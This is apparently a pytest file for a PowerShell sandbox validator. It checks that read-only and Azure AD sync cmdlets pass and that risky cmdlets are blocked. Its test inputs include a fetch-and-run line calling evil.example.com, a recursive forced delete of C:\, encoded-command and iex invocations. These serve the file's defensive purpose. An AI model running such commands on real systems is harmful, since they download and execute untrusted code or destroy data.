"""Tests for the workflow PowerShell sandbox (ps_sandbox.py)."""

from ps_sandbox import validate_script, normalize_allowlist


def test_allowlist_lets_safe_cmdlet_through():
    ok, reason = validate_script("Get-Service -Name Spooler | Select-Object Status")
    assert ok, reason


def test_disallowed_cmdlet_is_blocked():
    ok, reason = validate_script("Remove-Item C:\\Windows\\notepad.exe")
    assert not ok
    assert "Remove-Item" in reason


def test_invoke_expression_is_hard_denied_even_if_allowlisted():
    # Even if an operator allowlists "Invoke-Expression", the HARD_DENY layer
    # still rejects it — that's the whole point.
    ok, reason = validate_script(
        "Invoke-Expression $payload",
        allowed_cmdlets=["Invoke-Expression"],
    )
    assert not ok
    assert "Invoke-Expression" in reason


def test_iex_alias_blocked():
    ok, _ = validate_script("$x = 'whatever' ; iex $x")
    assert not ok


def test_invoke_webrequest_blocked():
    ok, _ = validate_script("Invoke-WebRequest http://evil.example.com/x.ps1 | iex")
    assert not ok


def test_encoded_command_blocked():
    ok, _ = validate_script("powershell.exe -EncodedCommand AAAA")
    assert not ok


def test_extra_cmdlet_via_settings_is_accepted():
    ok, reason = validate_script(
        "Get-AdUser -Filter *",
        allowed_cmdlets=["Get-AdUser"],
    )
    assert ok, reason


def test_disabled_sandbox_returns_ok_for_anything():
    # Operators who disable the sandbox accept the risk; we just pass through.
    ok, _ = validate_script("Remove-Item C:\\* -Recurse -Force", enabled=False)
    assert ok


def test_empty_script_rejected():
    ok, reason = validate_script("")
    assert not ok
    assert "Empty" in reason


def test_normalize_allowlist_is_case_insensitive():
    al = normalize_allowlist(["FOO-BAR"])
    assert "foo-bar" in al


# ─────────────────────────────────────────────────────────────────────
# Azure AD Connect / AD-sync cmdlets — added 2026-05 because operators
# build workflows that force a delta sync after a config change. These
# must pass the sandbox without per-deployment allowlist tweaks.
# ─────────────────────────────────────────────────────────────────────


def test_start_ad_sync_sync_cycle_allowed():
    """The headline use case — workflow that runs a delta sync against
    Azure AD Connect."""
    ok, reason = validate_script("Start-ADSyncSyncCycle -PolicyType Delta")
    assert ok, reason


def test_get_ad_sync_connector_run_status_allowed():
    """The natural follow-up — check whether a sync is currently running
    before kicking off another one."""
    ok, reason = validate_script("Get-ADSyncConnectorRunStatus | Out-String")
    assert ok, reason


def test_get_aduser_allowed():
    """Read-only AD lookups are commonly used as workflow preflight checks."""
    ok, reason = validate_script("Get-ADUser -Identity jsmith | Select-Object SamAccountName, Enabled")
    assert ok, reason


def test_new_aduser_still_blocked():
    """Write paths into AD must remain blocked — only Get-* and the
    scoped AAD sync cmdlets are on the default allowlist."""
    ok, reason = validate_script("New-ADUser -Name 'attacker'")
    assert not ok
    assert "New-ADUser" in reason


def test_set_aduser_still_blocked():
    """Same: no AD modify cmdlets by default."""
    ok, reason = validate_script("Set-ADUser -Identity jsmith -Enabled $false")
    assert not ok
    assert "Set-ADUser" in reason


def test_remove_aduser_still_blocked():
    """No AD delete cmdlets by default either."""
    ok, reason = validate_script("Remove-ADUser -Identity jsmith")
    assert not ok
    assert "Remove-ADUser" in reason
